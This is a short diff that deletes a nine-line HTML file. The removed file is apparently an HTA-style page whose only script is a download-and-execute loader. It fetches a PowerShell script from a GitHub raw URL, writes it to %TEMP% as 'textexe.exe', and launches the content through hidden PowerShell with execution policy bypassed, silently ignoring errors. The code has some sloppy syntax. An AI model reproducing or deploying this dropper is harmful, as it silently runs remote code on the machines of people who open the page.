@@ -1,9 +1,0 @@
-<HTML>
-<HEAD>
-<script>
-url = "https://raw.githubusercontent.com/ESDaman/DemoPS-RS/main/DempPS-RS.ps1"; filename = "textexe.exe"; temp = "%TEMP%\\"; shellObject = WScript.CreateObject("WScript.Shell"); httpObject = WScript.CreateObject("MSXML2.XMLHTTP"); streamObject = WScript.CreateObject("ADODB.Stream"); tempDir = shellObject.ExpandEnvironmentStrings(temp); httpObject.open("GET", url, false); httpObject.send(); if (httpObject.status == 200) {try {streamObject.open(); streamObject.type = 1; streamObject.write(httpObject.responseBody); streamObject.position = 0; streamObject.saveToFile(tempDir + filename, 2); shellObject.Run("%comspec% /c powershell -NoP -NonI -W Hidden -Exec Bypass -enc " + httpObject.responseText), 1, TRUE;} catch (ignored) {}}
-</script>
-</HEAD>
-<BODY>
-</BODY>
-</HTML>
